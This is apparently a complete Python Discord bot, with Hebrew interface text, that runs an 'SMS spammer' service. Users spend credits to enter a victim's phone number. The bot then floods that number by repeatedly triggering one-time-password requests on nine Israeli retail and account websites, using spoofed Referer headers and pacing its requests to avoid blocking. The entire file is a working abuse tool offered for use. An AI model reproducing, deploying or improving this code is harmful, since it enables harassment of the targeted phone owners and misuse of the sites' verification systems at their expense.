import discord
from discord.ext import commands
from discord import ui
import requests
import uuid
import os
import time
from flask import Flask
from threading import Thread
from datetime import datetime

# --- שרת Flask לשמירה על הבוט בחיים ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות ---
TOKEN = os.environ.get('DISCORD_TOKEN')
ADMIN_ID = 1281295891579408418

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# --- נתונים (יתאפסו בכל Deploy ב-Render) ---
user_credits = {} 
daily_claimed = {}

def send_spam(target):
    # החזרתי את כל האתרים הקודמים שביקשת
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Atmos General", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
        {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
        {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"}
    ]
    
    success = 0
    for site in apis:
        try:
            h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
            if site["type"] == "json":
                res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.8)
            else:
                res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.8)
            if res.status_code in [200, 201, 204]: 
                success += 1
            time.sleep(0.5) # השהיה קלה למניעת חסימות
        except: pass
    return success

# --- ממשק משתמש (UI) ---

class AttackModal(ui.Modal, title='🚀 Spam-Me Control'):
    phone = ui.TextInput(label='מספר טלפון', placeholder='0501234567', min_length=10, max_length=10)
    rounds = ui.TextInput(label='כמות סיבובים (קרדיטים)', placeholder='1 קרדיט = סיבוב אחד', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        uid = interaction.user.id
        try:
            needed = int(self.rounds.value)
        except:
            return await interaction.response.send_message("❌ נא להזין מספר תקין", ephemeral=True)
            
        if user_credits.get(uid, 0) < needed:
            return await interaction.response.send_message(f"❌ אין לך מספיק קרדיטים! יתרה נוכחית: {user_credits.get(uid, 0)}", ephemeral=True)
        
        user_credits[uid] -= needed
        await interaction.response.send_message(f"⚡ התקיפה על {self.phone.value} החלה! ({needed} סיבובים)", ephemeral=True)
        
        for _ in range(needed):
            send_spam(self.phone.value)

class AttackView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label='🚀 Spam Phone', style=discord.ButtonStyle.primary, custom_id='spam_btn')
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(AttackModal())

    @ui.button(label='💰 My Credits', style=discord.ButtonStyle.secondary, custom_id='credits_btn')
    async def credits_button(self, interaction: discord.Interaction, button: ui.Button):
        bal = user_credits.get(interaction.user.id, 0)
        await interaction.response.send_message(f"💰 היתרה שלך: **{bal} קרדיטים**", ephemeral=True)

    @ui.button(label='🎁 Daily Gift', style=discord.ButtonStyle.success, custom_id='gift_btn')
    async def gift_button(self, interaction: discord.Interaction, button: ui.Button):
        uid = interaction.user.id
        today = datetime.now().date()
        if daily_claimed.get(uid) == today:
            return await interaction.response.send_message("❌ כבר לקחת את המתנה היומית שלך!", ephemeral=True)
        
        user_credits[uid] = user_credits.get(uid, 0) + 5
        daily_claimed[uid] = today
        await interaction.response.send_message("✅ קיבלת **5 קרדיטים** מתנה! תהנה.", ephemeral=True)

@bot.event
async def on_ready():
    print(f'✅ {bot.user.name} מחובר ומוכן!')

@bot.command()
async def setup(ctx):
    if ctx.author.id == ADMIN_ID:
        embed = discord.Embed(
            title="🚀 Spam-Me Control Panel",
            description=(
                "**הוראות שימוש:**\n"
                "1️⃣ לחץ על **Daily Gift** כדי לקבל 5 קרדיטים בחינם כל יום.\n"
                "2️⃣ לחץ על **Spam Phone** כדי להפעיל תקיפה (כל סיבוב עולה קרדיט אחד).\n"
                "3️⃣ לחץ על **My Credits** כדי לראות כמה נשאר לך.\n\n"
                "⚠️ *השימוש באחריות המשתמש בלבד.*"
            ),
            color=0x5865F2
        )
        embed.set_footer(text="Sason Spammer Service")
        await ctx.send(embed=embed, view=AttackView())

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
